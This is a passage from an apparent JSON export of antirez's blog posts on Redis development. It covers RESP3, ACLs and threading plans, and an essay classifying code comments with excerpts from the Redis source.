Moreover, as you know, Redis 6 will be completely backward compatible with RESP2. Actually I\u2019m starting to believe that RESP2 support will never be removed, because it is almost for free, and there is no good reason to break backward compatibility once we did the effort to implement the abstraction layer between RESP2 and RESP3.  Normally I don\u2019t like to change things without a good reason, however RESP2 limitations were having a strong effect on the client ecosystem. I would like to have a client landscape where users, going from one client to the other, will feel at home, and the API will be the Redis API, not the layer that the client author invented. I\u2019m not against an *higher level* API in addition to the lower level one btw, but there should be a common ground, and clients should be able to send commands without knowing anything about such commands.  ## ACLs  The ACL specification was redacted by myself four years ago. I waited so much time in order to convince myself this was really the time to implement it: we went a long way without any ACL using just tricks, mainly command renaming. However don\u2019t believe that ACLs main motivation is enterprise customers in need for security. As a side effect, ACLs also allow authentication of users for security purposes, but the main goal of the feature is *operational*.  Let me show you an example. You have a Redis instance and you plan to use the instance to do a new thing: delayed jobs processing. You get a library from the internet, and it looks to work well. Now why on the earth such library, that you don\u2019t know line by line, should be able to call \u201cFLUSHALL\u201d and flush away your database instantly? Maybe the library test will have such command inside and you realize it when it\u2019s too late. Or maybe you just hired a junior developer that is keeping calling \u201cKEYS *\u201d on the Redis instance, while your company Redis policy is \u201cNo KEYS command\u201d.  Another scenario, cloud providers: they need to carefully rename the admin commands, and even to mask such commands from being leaked for some reason. More tricks: so MONITOR will not show the commands in the output for instance. With ACLs you can setup Redis so that default users, without some authentication, will be prevented to run anything that is administrative or dangerous. I think this will be a big improvement for operations.  Moreover ACLs is one of the best code I wrote for Redis AFAIK. There is nearly no CPU cost at all, unless you se key patterns, but even so it\u2019s small. The implementation is completely self contained inside the acl.c file, the rest of the core has a handful of calls to the ACL API. No complexity added to the system because it is completely modular. Actually the ACL code allowed to do some good refactoring around the AUTH command.  ## Multi threading  There are two possible multi threading supports that Redis could get. I believe the user is referring to \u201cmemcached alike\u201d multithreading, that is the ability to scale a single Redis instance to multiple threads in order to increase the operations per second it can deliver in things like GET or SET and other simple commands. This involves making the I/O, command parsing and so forth multi threaded. So let\u2019s call this thing \u201cI/O threading\u201d.  Another multi threaded approach is to, instead, allow slow commands to be executed in a different thread, so that other clients are not blocked. We\u2019ll call this threading model \u201cSlow commands threading\u201d.  Well, that\u2019s the plan: I/O threading is not going to happen in Redis AFAIK, because after much consideration I think it\u2019s a lot of complexity without a good reason. Many Redis setups are network or memory bound actually. Additionally I really believe in a share-nothing setup, so the way I want to scale Redis is by improving the support for multiple Redis instances to be executed in the same host, especially via Redis Cluster. The things that will happen in 2019 about that are two:  A) Redis Cluster multiple instances will be able to orchestrate to make a judicious use of the disk of the local instance, that is, let\u2019s avoid an AOF rewrite at the same time.  B) We are going to ship a Redis Cluster proxy as part of the Redis project, so that users are able to abstract away a cluster without having a good implementation of the Cluster protocol client side.  Another thing to note is that Redis is not Memcached, but, like memcached, is an in-memory system. To make multithreaded an in-memory system like memcached, with a very simple data model, makes a lot of sense. A multi-threaded on-disk store is mandatory. A multi-threaded complex in-memory system is in the middle where things become ugly: Redis clients are not isolated, and data structures are complex. A thread doing LPUSH need to serve other threads doing LPOP. There is less to gain, and a lot of complexity to add.  What instead I *really want* a lot is slow operations threading, and with the Redis modules system we already are in the right direction. However in the future (not sure if in Redis 6 or 7) we\u2019ll get key-level locking in the module system so that threads can completely acquire control of a key to process slow operations. Now modules can implement commands and can create a reply for the client in a completely separated way, but still to access the shared data set a global lock is needed: this will go away.  ## Better persistence  Recently we did multiple efforts in order to improve this kind of fundamental functions of Redis. One of the best thing that was implemented lately is the RDB preamble inside the AOF file. Also a lot of work went both in Redis 4 and 5 about replication, that is now completely at another level compared to what it used to be. And yes, it is still one of my main focus to improve such parts.  ## Data structures  Now Redis has Streams, starting with Redis 5. For Redis 6 and 7 what is planned is, to start, to make what we have much more memory efficient by changing the implementations of certain things. However to add new data structures there are a lot of considerations to do. It took me years to realize how to fill the gap, with streams, between lists, pub/sub and sorted sets, in the context of time series and streaming. I really want Redis to be a set of orthogonal data structures that the user can put together, and not a set of *tools* that are ready to use. Streams are an abstract log, so I think it\u2019s a very worthwhile addition. However other things I\u2019m not completely sure if they are worth to be inside the core without a very long consideration. Anyway in the latest years there was definitely more stress in adding new data structures. HyperLogLogs, more advanced bit operations, streams, blocking sorted set operations (ZPOP* and BZPOP*), and streams are good examples.  ## Conclusions  I believe that the Redis community should be aware about why something is done and why something is instead postponed. I do the error to communicate a lot via Twitter like if everybody is there, but many people happen to have a life :-D and don\u2019t care. The blog is a much better way to inform the community, I need to take the time to blog more. Incidentally I love to write posts, so it\u2019s a win-win. An important thing to realize is that Redis has not a solid roadmap, over the years I found that opportunistic development is a huge win over having a roadmap. Something is demanded? I see the need? I\u2019m in the mood to code it? It\u2019s the right moment because there are no other huge priorities? There are a set of users that are helping the design process, giving hints, ideas, testing stuff? It\u2019s the right moment, let\u2019s do it. To have a solid roadmap for Redis is silly because the size of the OSS core team is small, sometimes I remain stuck with some random crash for weeks\u2026 Any fixed long term plan would not work. Moreover as the Redis community gives feedbacks my ideas change a lot, so I would rewrite the roadmap every month. Yet blogging is a good solution to at least show what is the current version of the priorities / ideas, and to show why other ideas were abandoned.  A final note: the level of freedom I've with Redis Labs about what to put inside the open source project side is almost infinite. I think this is kinda of a miracle in the industry, or just the people I work with at Redis Labs are nice folks that understand that what we are doing originated from the open source movement and is wise to keep it going in that way. But it's not a common thing. If I do errors in the Redis roadmap they are surely my errors. Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2019-02-20T12:14:11Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 9258.8976522, "slug": "an-update-about-redis-developments-in-2019-14", "topics": []}}, {"model": "app.post", "pk": 15, "fields": {"title": "Why RESP3 will be the only protocol supported by Redis 6", "link": "http://antirez.com/news/125", "source": 1, "normalized_link": "antirez.com/news/125", "summary": "[EDIT! I'm reconsidering all this because Marc Gravell  from Stack Overflow suggested that we could just switch protocol for backward compatibility per-connection, sending a command to enable RESP3. That means no longer need for a global configuration that switches the behavior of the server. Put in that way it is a lot more acceptable for me, and I'm reconsidering the essence of the blog post]  A few weeks after the release of Redis 5, I\u2019m here starting to implement RESP3, and after a few days of work it feels very well to see this finally happening. RESP3 is the new client-server protocol that Redis will use starting from Redis 6. The specification at https://github.com/antirez/resp3 should explain in clear terms how this evolution of our old protocol, RESP2, should improve the Redis ecosystem. But let\u2019s say that the most important thing is that RESP3 is more \u201csemantic\u201d than RESP2. For instance it has the concept of maps, sets (unordered lists of elements), attributes of the returned data, that may augment the reply with auxiliary information, and so forth. The final goal is to make new Redis clients have less work to do for us, that is, just deciding a set of fixed rules in order to convert every reply type from RESP3 to a given appropriate type of the client library programming language.  In the future of Redis I see clients that are smarter under the hood, trying to do their best in order to handle connections, pipelining, and state, and apparently a lot more simpler in the user-facing side, to the point that the ideal Redis client is like:      result = redis.call(\u201cGET\u201d,keyname);  Of course on top of that you can build more advanced abstractions, but the bottom layer should look like that, and the returned reply should not require any filtering that is ad-hoc for specific commands: RESP3 return type should contain enough information to return an appropriate data type. So HGETALL will return a RESP3 \u201cmap\u201d, while LRANGE will return an \u201carray\u201d, and EXISTS will return a RESP3 \u201cboolean\u201d.  This also allows new commands to work as expected even if the client library was not *specifically* designed to handle it. With RESP2 instead what happened was that likely the command worked using mechanisms like \"method missing\" or similar, but later when the command was *really* implemented in the client library, the returned type changed, introducing a subtle incompatibility.  However, while the new protocol is an incremental improvement over the old one, it will introduce breaking incompatibilities in the client-library side (of course) and *in the application layer* as well. Because for instance, ZSCORE will now return a double, and not a string, so application code should be updated, or, alternatively, client libraries could implement a compatibility option that will turn the RESP3 replies back to their original RESP2 types.   Lua scripts will also no longer work if not modified for the new protocol, because also Lua will see more semantical types returned by the redis.call() command. Similarly Lua will be able to return all the new data types implemented in RESP3.  Because of all that, people are scared about my decision: I\u2019m going to ship Redis 6 with support for *only* RESP3. There will be no compatibility mode to switch a Redis 6 server to RESP2, so you either upgrade your client library and upgrade your application (or use the client library backward compatibility mode), or you cannot switch to Redis 6.  I\u2019ve good reasons to do so, and I want to explain why I\u2019m taking this decision, and how I\u2019m mitigating the problems for users and client library authors. Let\u2019s start from the mitigations:  * Redis 5 will be fully supported for 2 years after the release of Redis 6. Everything critical will be back-ported to Redis 5 and patch-level releases will be available constantly.  * Redis 6 is expected to be released in about 1 or 1.5 years. However Redis 6 will be switched to RESP3 in about 1 month. So people will use, experiment, and deal with an unstable Redis version that uses the new protocol for a lot of time. Given that unlike many other softwares, Redis unstable has a lot of casual users, both because it\u2019s the default branch on Github, and because traditionally Redis unstable is never really so unstable, this will grant a lot of prior exposure.  * I\u2019m still not 100% sure about that, but the Lua scripting engine may have a compatibility mode in order to return the same types as of Redis 5. The compatibility however will not be enabled by default, and will be opt-in for each script executed, by calling a special redis.resp2_compat() function before calling Redis commands. So every Redis 6 server will behave the same regardless of its configuration, as Redis always did in the last 10 years.  Those are the mitigations. And this is, instead, why I\u2019ll not have Redis 6 supporting both versions:  1) It is more or less completely useless. If people switch Redis 6 to RESP2 mode, they are still in the past and are just waiting for Redis 7 to go out without RESP2 support and break everything. In the meantime, when you deal with a Redis 6 installation, you never know *what it replies*, depending on how it is configured. So the same client library may return an Hash or an Array for the same command.  2) It\u2019s more work and more complexity without a good reason (see \u201c1\u201d). Many commands will require a check for the old protocol in order to see in what format to reply.  3) By binding the new Redis 6 features together with a protocol change, we are giving good reasons to users to do the switch and port their clients and applications. At some point everything will be over and we can focus on new things. Otherwise we\u2019ll have a set of Redis 6 users that switched to the new server for the new features but are still with the old protocol, and Redis 7 will be the same drama again.   4) If somebody tells you that adapting the client libraries is a terrible work, well, I\u2019ll beg to differ. Yes, there is some change to do, but now that I\u2019m implementing the server side, I see that it\u2019s not so terrible. What is terrible instead is that most client work is not payed at all and happens just because of passion and willingness to share with others. I bet that we\u2019ll see many implementations of RESP3 in short time.  5) RESP3 is designed so that clients can automatically detect if it\u2019s RESP2 or RESP3, and switch, so new clients will work both with Redis <= 5 and Redis 6.  Well that\u2019s all. I hope it clarifies my point of view and the reasons behind it, and also at the same time the mitigations that will be enabled during the protocol switch may serve to convince users that it will not be a very \u201chard\u201d breakage. Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2018-11-09T15:31:10Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 9061.4002967, "slug": "why-resp3-will-be-the-only-protocol-supported-by-redis-6-15", "topics": []}}, {"model": "app.post", "pk": 16, "fields": {"title": "Writing system software: code comments.", "link": "http://antirez.com/news/124", "source": 1, "normalized_link": "antirez.com/news/124", "summary": "For quite some time I\u2019ve wanted to record a new video talking about code comments for my \"writing system software\" series on YouTube. However, after giving it some thought, I realized that the topic was better suited for a blog post, so here we are. In this post I analyze Redis comments, trying to categorize them.  Along the way I try to show why, in my opinion, writing comments is of paramount importance in order to produce good code, that is maintainable in the long run and understandable by others and by the authors during modifications and debugging activities.  Not everybody thinks likewise. Many believe that comments are useless if the code is solid enough. The idea is that when everything is well designed, the code itself documents what the code is doing, hence code comments are superfluous. I disagree with that vision for two main reasons:  1. Many comments don't explain what the code is doing. They explain what you can't understand just from what the code does. Often this missing information is *why* the code is doing a certain action, or why it\u2019s doing something that is clear instead of something else that would feel more natural.  2. While it is not generally useful to document, line by line, what the code is doing, because it is understandable just by reading it, a key goal in writing readable code is to lower the amount of effort and the number of details the reader should take into her or his head while reading some code. So comments can be, for me, a tool for lowering the cognitive load of the reader.  The following code snippet is a good example of the second point above. Note that all the code snippets in this blog post are obtained from the Redis source code. Every code snipped is presented prefixed by the file name it was extracted from. The branch used is the current \"unstable\" with hash 32e0d237.  scripting.c:     /* Initial Stack: array */     lua_getglobal(lua,\"table\");     lua_pushstring(lua,\"sort\");     lua_gettable(lua,-2);       /* Stack: array, table, table.sort */     lua_pushvalue(lua,-3);      /* Stack: array, table, table.sort, array */     if (lua_pcall(lua,1,0,0)) {         /* Stack: array, table, error */          /* We are not interested in the error, we assume that the problem is          * that there are 'false' elements inside the array, so we try          * again with a slower function but able to handle this case, that          * is: table.sort(table, __redis__compare_helper) */         lua_pop(lua,1);             /* Stack: array, table */         lua_pushstring(lua,\"sort\"); /* Stack: array, table, sort */         lua_gettable(lua,-2);       /* Stack: array, table, table.sort */         lua_pushvalue(lua,-3);      /* Stack: array, table, table.sort, array */         lua_getglobal(lua,\"__redis__compare_helper\");         /* Stack: array, table, table.sort, array, __redis__compare_helper */         lua_call(lua,2,0);     }  Lua uses a stack based API. A reader following each call in the function above, having also a Lua API reference at hand, will be able to mentally reconstruct the stack layout at every given moment. But why to force the reader to do such effort? While writing the code, the original author had to do that mental effort anyway. What I did there was just to annotate every line with the current stack layout after every call. Reading this code is now trivial, regardless of the fact the Lua API is otherwise non trivial to follow.  My goal here is not just to offer my point of view on the usefulness of comments as a tool to provide a background that is not clearly available reading a local section of the source code. But also to also provide some evidence about the usefulness of the kind of comments that are historically considered useless or even dangerous, that is, comments stating *what* the code is doing, and not why.  # Classification of comments  The way I started this work was by reading random parts of the Redis source code, to check if and why comments were useful in different contexts. What quickly emerged was that comments are useful for very different reasons, since they tend to be very different in function, writing style, length and update frequency. I eventually turned the work into a classification task.  During my research I identified nine types of comments:  * Function comments * Design comments * Why comments * Teacher comments * Checklist comments * Guide comments * Trivial comments * Debt comments * Backup comments  The first six are, in my opinion, mostly very positive forms of commenting, while the final three are somewhat questionable. In the next sections each type will be analyzed with examples from the Redis source code.  FUNCTION COMMENTS  The goal of a function comment is to prevent the reader from reading code in the first place. Instead, after reading the comment, it should be possible to consider some code as a black box that should obey certain rules. Normally function comments are at the top of functions definitions, but they may be at other places, documenting classes, macros, or other functionally isolated blocks of code that define some interface.  rax.c:      /* Seek the grestest key in the subtree at the current node. Return 0 on      * out of memory, otherwise 1. This is an helper function for different      * iteration functions below. */     int raxSeekGreatest(raxIterator *it) {     ...  Function comments are actually a form of in-line API documentation. If the function comment is written well enough, the user should be able most of the times to jump back to what she was reading (reading the code calling such API) without having to read the implementation of a function, a class, a macro, or whatever.  Among all the kinds of comments, these are the ones most widely accepted by the programming community at large as needed. The only point to analyze is if it is a good idea to place comments that are largely API reference documentation inside the code itself. For me the answer is simple: I want the API documentation to exactly match the code. As the code is changed, the documentation should be changed. For this reason, by using function comments as a prologue of functions or other elements, we make the API documentation close to the code, accomplishing three results:  * As the code is changed, the documentation can be easily changed at the same time, without the risk of making the API reference stale.  * This approach maximizes the probability that the author of the change, that should be the one better understanding the change, will also be the author of the API documentation change.  * Reading the code is handy to find the documentation of functions or methods directly where they are defined, so that the reader of the code can focus solely on the code, instead of context switching between code and documentation.  DESIGN COMMENTS  While a \"function comment\" is usually located at the start of a function, a design comment is more often located at the start of a file. The design comment basically states how and why a given piece of code uses certain algorithms, techniques, tricks, and implementation. It is an higher level overview of what you'll see implemented in the code. With such background, reading the code will be simpler. Moreover I tend to trust more code where I can find design notes. At least I know that some kind of explicit design phase happened, at some point, during the development process.  In my experience design comments are also very useful in order to state, in case the solution proposed by the implementation looks a bit too trivial, what were the competing solutions and why a very simple solution was considered to be enough for the case at hand. If the design is correct, the reader will convince herself that the solution is appropriate and that such simplicity comes from a process, not from being lazy or only knowing how to code basic things.  bio.c:      * DESIGN      * ------      *      * The design is trivial, we have a structure representing a job to perform      * and a different thread and job queue for every job type.      * Every thread waits for new jobs in its queue, and process every job      * sequentially.      ...  WHY COMMENTS  Why comments explain the reason why the code is doing something, even if what the code is doing is crystal clear. See the following example from the Redis replication code.  replication.c:      if (idle > server.repl_backlog_time_limit) { \t/* When we free the backlog, we always use a new \t * replication ID and clear the ID2. This is needed \t * because when there is no backlog, the master_repl_offset \t * is not updated, but we would still retain our replication \t * ID, leading to the following problem: \t * \t * 1. We are a master instance. \t * 2. Our replica is promoted to master. It's repl-id-2 will \t *    be the same as our repl-id. \t * 3. We, yet as master, receive some updates, that will not \t *    increment the master_repl_offset. \t * 4. Later we are turned into a replica, connect to the new \t *    master that will accept our PSYNC request by second \t *    replication ID, but there will be data inconsistency \t *    because we received writes. */ \tchangeReplicationId(); \tclearReplicationId2(); \tfreeReplicationBacklog(); \tserverLog(LL_NOTICE, \t    \"Replication backlog freed after %d seconds \" \t    \"without connected replicas.\", \t    (int) server.repl_backlog_time_limit);     }  If I check just the function calls there is very little to wonder: if a timeout is reached, change the main replication ID, clear the secondary ID, and finally free the replication backlog. However what is not exactly clear is why we need to change the replication IDs when freeing the backlog.  Now this is the kind of thing that happens continuously in software once it has reached a given level of complexity. Regardless of the code involved, the replication protocol has some level of complexity itself, so we need to do certain things in order to make sure that other bad things can't happen. Probably these kind of comments are, in some way, opportunities to reason about the system and check if it should be improved, so that such complexity is no longer needed, hence also the comment can be removed. However often making something simpler may make something else harder or is simply not viable, or requires future work breaking backward compatibility.  Here is another one.  replication.c:      /* SYNC can't be issued when the server has pending data to send to      * the client about already issued commands. We need a fresh reply      * buffer registering the differences between the BGSAVE and the current      * dataset, so that we can copy to other replicas if needed. */     if (clientHasPendingReplies(c)) {         addReplyError(c,\"SYNC and PSYNC are invalid with pending output\");         return;     }  If you run SYNC while there is still pending output (from a past command) to send to the client, the command should fail because during the replication handshake the output buffer of the client is used to accumulate changes,  and may be later duplicated to serve other replicas connecting while we are already creating the RDB file for the full sync with the first replica. This is the why we do that. What we do is trivial. Pending replies? Emit an error. Why is rather obscure without the comment.  One may think that such comments are needed only when describing complex protocols and interactions, like in the case of replication. Is that the case? Let's change completely file and goals, and we see still such comments everywhere.  expire.c:      for (j = 0; j < dbs_per_call && timelimit_exit == 0; j++) {         int expired;         redisDb *db = server.db+(current_db % server.dbnum);          /* Increment the DB now so we are sure if we run out of time          * in the current DB we'll restart from the next. This allows to          * distribute the time evenly across DBs. */         current_db++;         ...  That's an interesting one. We want to expire keys from different DBs, as long as we have some time. However instead of incrementing the \u201cdatabase ID\u201d to process next at the end of the loop processing the current database, we do it differently: we select the current DB in the `db` variable, but then we immediately increment the ID of the next database to process (at the next call of this function). This way if the function terminates because too much effort was spent in a single call, we don't have the problem of restarting again from the same database, letting logically expired keys accumulating in the other databases since we are too focused in processing the same database again and again.  With such comment we both explain why we increment at that stage, and that the next person going to modify the code, should preserve such quality. Note that without the comment the code looks completely harmless. Select, increment, go to do some work. There is no evident reason for not relocating the increment at the end of the loop where it could look more natural.  Trivia: the loop increment was indeed at the end in the original code. It was moved there during a fix: at the same time the comment was added. So let's say this is kinda of a \"regression comment\".  TEACHER COMMENTS  Teacher comments don't try to explain the code itself or certain side effects we should be aware of. They teach instead the *domain* (for example math, computer graphics, networking, statistics, complex data structures) in which the code is operating, that may be one outside of the reader skills set, or is simply too full of details to recall all them from memory.  The LOLWUT command in version 5 needs to display rotated squares on the screen (http://antirez.com/news/123). In order to do so it uses some basic trigonometry: despite the fact that the math used is simple, many programmers reading the Redis source code may not have any math background, so the comment at the top of the function explains what's going to happen inside the function itself.  lolwut5.c:      /* Draw a square centered at the specified x,y coordinates, with the specified      * rotation angle and size. In order to write a rotated square, we use the      * trivial fact that the parametric equation:      *      *  x = sin(k)      *  y = cos(k)      *      * Describes a circle for values going from 0 to 2*PI. So basically if we start      * at 45 degrees, that is k = PI/4, with the first point, and then we find      * the other three points incrementing K by PI/2 (90 degrees), we'll have the      * points of the square. In order to rotate the square, we just start with      * k = PI/4 + rotation_angle, and we are done.      *      * Of course the vanilla equations above will describe the square inside a      * circle of radius 1, so in order to draw larger squares we'll have to      * multiply the obtained coordinates, and then translate them. However this      * is much simpler than implementing the abstract concept of 2D shape and then      * performing the rotation/translation transformation, so for LOLWUT it's      * a good approach. */  The comment does not contain anything that is related to the code of the function itself, or its side effects, or the technical details related to the function. The description is only limited to the mathematical concept that is used inside the function in order to reach a given goal.  I think teacher comments are of huge value. They teach something in case the reader is not aware of such concepts, or at least provide a starting point for further investigation. But this in turn means that a teacher comment increases the amount of programmers that can read some code path: writing code that can be read by many programmers is a major goal of mine. There are developers that may not have math skills but are very solid programmers that can contribute some wonderful fix or optimization. And in general code should be read other than being executed, since is written by humans for other humans.  There are cases where teacher comments are almost impossible to avoid in order to write decent code. A good example is the Redis radix tree implementation. Radix trees are articulated data structures. The Redis implementation re-states the whole data structure theory as it implements it, showing the different cases and what the algorithm does to merge or split nodes and so forth. Immediately after each section of comment, we have the code implementing what was written before. After months of not touching the file implementing the radix tree, I was able to open it, fix a bug in a few minutes, and continue doing something else. There is no need to study again how a radix tree works, since the explanation is the same thing as the code itself, all mixed together.  The comments are too long, so I'll just show certain snippets.  rax.c:      /* If the node we stopped at is a compressed node, we need to      * split it before to continue.      *      * Splitting a compressed node have a few possible cases.      * Imagine that the node 'h' we are currently at is a compressed      * node contaning the string \"ANNIBALE\" (it means that it represents      * nodes A -> N -> N -> I -> B -> A -> L -> E with the only child      * pointer of this node pointing at the 'E' node, because remember that      * we have characters at the edges of the graph, not inside the nodes      * themselves.      *      * In order to show a real case imagine our node to also point to      * another compressed node, that finally points at the node without      * children, representing 'O':      *      *     \"ANNIBALE\" -> \"SCO\" -> []       ... snip ...       * 3a. IF $SPLITPOS == 0:      *     Replace the old node with the split node, by copying the auxiliary      *     data if any. Fix parent's reference. Free old node eventually      *     (we still need its data for the next steps of the algorithm).      *      * 3b. IF $SPLITPOS != 0:      *     Trim the compressed node (reallocating it as well) in order to      *     contain $splitpos characters. Change chilid pointer in order to link      *     to the split node. If new compressed node len is just 1, set      *     iscompr to 0 (layout is the same). Fix parent's reference.       ... snip ...          if (j == 0) {             /* 3a: Replace the old node with the split node. */             if (h->iskey) {                 void *ndata = raxGetData(h);                 raxSetData(splitnode,ndata);             }             memcpy(parentlink,&splitnode,sizeof(splitnode));         } else {             /* 3b: Trim the compressed node. */             trimmed->size = j;             memcpy(trimmed->data,h->data,j);             trimmed->iscompr = j > 1 ? 1 : 0;             trimmed->iskey = h->iskey;             trimmed->isnull = h->isnull;             if (h->iskey && !h->isnull) {                 void *ndata = raxGetData(h);                 raxSetData(trimmed,ndata);             }             raxNode **cp = raxNodeLastChildPtr(trimmed);         ...  As you can see the description in the comment is then matched with the same labels in the code. It's hard to show it all in this form so if you want to get the whole idea just check the full file at:      https://github.com/antirez/redis/blob/unstable/src/rax.c  This level of commenting is not needed for everything, but things like radix trees are really full of little details and corner cases. They are hard to recall, and certain details are *specific* to a given implementation. Doing this for a linked list does not make much sense of course. It's a matter of personal sensibility to understand when it's worth it or not.  CHECKLIST COMMENTS  This is a very common and odd one: sometimes because of language limitations, design issues, or simply because of the natural complexity arising in systems, it is not possible to centralize a given concept or interface in one piece, so there are places in the code that tells you to remember to do things in some other place of the code. The general concept is:      /* Warning: if you add a type ID here, make sure to modify the      * function getTypeNameByID() as well. */  In a perfect world this should never be needed, but in practice sometimes there are no escapes from that. For example Redis types could be represented using an \"object type\" structure, and every object could link to the type the object it belongs, so you could do:      printf(\"Type is %s\\n\", myobject->type->name);  But guess what? It's too expensive for us, because a Redis object is represented like this:      typedef struct redisObject {         unsigned type:4;         unsigned encoding:4;         unsigned lru:LRU_BITS; /* LRU time (relative to global lru_clock) or                                 * LFU data (least significant 8 bits frequency                                 * and most significant 16 bits access time). */         int refcount;         void *ptr;     } robj;  We use 4 bits instead of 64 to represent the type. This is just to show why sometimes things are not as centralized and natural as they should be. When the situation is like that, sometimes what helps is to use defensive commenting in order to make sure that if a given code section is touched, it reminds you to make sure to also modify other parts of the code. Specifically a checklist comment does one or both of the following things:  * It tells you a set of actions to do when something is modified.  * It warns you about the way certain changes should be operated.  Another example in blocked.c, when a new blocking type is introduced.  blocked.c:       * When implementing a new type of blocking opeation, the implementation      * should modify unblockClient() and replyToBlockedClientTimedOut() in order      * to handle the btype-specific behavior of this two functions.      * If the blocking operation waits for certain keys to change state, the      * clusterRedirectBlockedClientIfNeeded() function should also be updated.  The checklist comment is also useful in a context similar to when certain \"why comments\" are used: when it is not obvious why some code must be executed at a given place, after or before something. But while the why comment may tell you why a statement is there, the checklist comment used in the same case is more biased towards telling you what rules to follow if you want to modify it (in this case the rule is, follow a given ordering), without breaking the code behavior.  cluster.c:      /* Update our info about served slots.      *      * Note: this MUST happen after we update the master/replica state      * so that CLUSTER_NODE_MASTER flag will be set. */  Checklist comments are very common inside the Linux kernel, where the order of certain operations is extremely important.  GUIDE COMMENT  I abuse guide comments at such a level that probably, the majority of comments in Redis are guide comments. Moreover guide comments are exactly what most people believe to be completely useless comments.  * They don't state what is not clear from the code.  * There are no design hints in guide comments.  Guide comments do a single thing: they babysit the reader, assist him or her while processing what is written in the source code by providing clear division, rhythm, and introducing what you are going to read.  Guide comments\u2019 sole reason to exist is to lower the cognitive load of the programmer reading some code.  rax.c:      /* Call the node callback if any, and replace the node pointer      * if the callback returns true. */     if (it->node_cb && it->node_cb(&it->node)) \tmemcpy(cp,&it->node,sizeof(it->node));      /* For \"next\" step, stop every time we find a key along the      * way, since the key is lexicographically smaller compared to      * what follows in the sub-children. */     if (it->node->iskey) { \tit->data = raxGetData(it->node);  \treturn 1;     }  There is nothing that the comments are adding to the code above. The guide comments above will assist you reading the code, moreover they'll acknowledge you about the fact you are understanding it right. More examples.  networking.c:      /* Log link disconnection with replica */     if ((c->flags & CLIENT_SLAVE) && !(c->flags & CLIENT_MONITOR)) {         serverLog(LL_WARNING,\"Connection with replica %s lost.\",             replicationGetSlaveName(c));     }      /* Free the query buffer */     sdsfree(c->querybuf);     sdsfree(c->pending_querybuf);     c->querybuf = NULL;      /* Deallocate structures used to block on blocking ops. */     if (c->flags & CLIENT_BLOCKED) unblockClient(c);     dictRelease(c->bpop.keys);      /* UNWATCH all the keys */     unwatchAllKeys(c);     listRelease(c->watched_keys);      /* Unsubscribe from all the pubsub channels */     pubsubUnsubscribeAllChannels(c,0);     pubsubUnsubscribeAllPatterns(c,0);     dictRelease(c->pubsub_channels);     listRelease(c->pubsub_patterns);      /* Free data structures. */     listRelease(c->reply);     freeClientArgv(c);      /* Unlink the client: this will close the socket, remove the I/O      * handlers, and remove references of the client from different      * places where active clients may be referenced. */     unlinkClient(c);  Redis is *literally* ridden of guide comments, so basically every file you open will contain plenty of them. Why bother? Of all the comment types I analyzed so far in this blog post, I'll admit that this is absolutely the most subjective one. I don't value code without such comments as less good, yet I firmly believe that if people regard the Redis code as readable, some part of the reason is because of all the guide comments.  Guide comments have some usefulness other than the stated ones. Since they clearly divide the code in isolated sections, an addition to the code is very likely to be inserted in the appropriate section, instead of ending in some random part. To have related statements nearby is a big readability win.  Also make sure to check the guide comment above before the unlinkClient() function is called. The guide comment briefly tells the reader what the function is going to do, avoiding the need to jump back into the function if you are only interested in the big picture.  TRIVIAL COMMENTS  Guide comments are very subjective tools. You may like them or not. I love them. However, a guide comment can degenerate into a a very bad comment: it can easily turn into a \"trivial comment\". A trivial comment is a guide comment where the cognitive load of reading the comment is the same or higher than just reading the associated code. The following form of trivial comment is exactly what many books will tell you to avoid.      array_len++;\t/* Increment the length of our array. */  So if you write guide comments, make sure you avoid writing trivial ones.  DEBT COMMENTS  Debt comments are technical debts statements hard coded inside the source code itself:  t_stream.c:      /* Here we should perform garbage collection in case at this point      * there are too many entries deleted inside the listpack. */     entries -= to_delete;     marked_deleted += to_delete;     if (entries + marked_deleted > 10 && marked_deleted > entries/2) { \t/* TODO: perform a garbage collection. */     }  The snippet above is extracted from the Redis streams implementation. Redis streams allow to delete elements from the middle using the XDEL command. This may be useful in different ways, especially in the context of privacy regulations where certain data cannot be retained no matter what data structure or system you are using in order to store them. It is a very odd use case for a mostly append only data structure, but if users start to delete more than 50% of items in the middle, the stream starts to fragment, being composed of \"macro nodes\". Entries are just flagged as deleted, but are only reclaimed once all the entries in a given macro node are freed. So your mass deletions will change the memory behavior of streams.  Right now, this looks like a non issue, since I don't expect users to delete most history in a stream. However it is possible that in the future we may want to introduce garbage collection: the macro node could be compacted once the ratio between the deleted entries and the existing entries reach a given level. Moreover nearby nodes may be glued together after the garbage collection. I was kind of afraid that later I would no longer remember what were the entry points to do the garbage collection, so I put TODO comments, and even wrote the trigger condition.  This is probably not great. A better idea was instead to write, in the design comment at the top of the file, why we are currently not performing GC. And what are the entry points for GC, if we want to add it later.  FIXME, TODO, XXX, \"This is a hack\", are all forms of debt comments. They are not great in general, I try to avoid them, but it's not always possible, and sometimes instead of forgetting forever about a problem, I prefer to put a node inside the source code. At least one should periodically grep for such comments, and see if it is possible to put the notes in a better place, or if the problem is no longer relevant or could be fixed right away.  BACKUP COMMENTS  Finally backup comments are the ones where the developer comments older versions of some code block or even a whole function, because she or he is insecure about the change that was operated in the new one. What is puzzling is that this still happens now that we have Git. I guess people have an uneasy feeling about losing that code fragment, considered more sane or stable, in some years old commit.  But source code is not for making backups. If you want to save an older version of a function or code part, your work is not finished and cannot be committed. Either make sure the new function is better than the past one, or take it just in your development tree until you are sure.  Backup comments end my classification. Let's try some conclusion.  # Comments as an analysis tool.  Comments are rubber duck debugging on steroids, except you are not talking with a rubber duck, but with the future reader of the code, which is more intimidating than a rubber duck, and can use Twitter. So in the process you really try to understand if what you are stating *is acceptable*, honorable, good enough. And if it is not, you make your homework, and come up with something more decent.  It is the same process that happens while writing documentation: the writer attempts to provide the gist of what a given piece of code does, what are the guarantees, the side effects. This is often a bug hunting opportunity. It is very easy while describing something to find that it has holes... You can't really describe it all because you are not sure about a given behavior: such behavior is just emerging from complexity, at random. You really don't want that, so you go back and fix it all. I find this a splendid reason to write comments.  # Writing good comments is harder than writing good code  You may think that writing comments is a lesser noble form of work. After all you *can code*! However consider this: code is a set of statement and function calls, or whatever your programming paradigm is. Sometimes such statements do not make much sense, honestly, if the code is not good. Comments require always to have some design process ongoing, and to understand the code you are writing in a deeper sense. On top of that, in order to write good comments, you have to develop your writing skills. The same writing 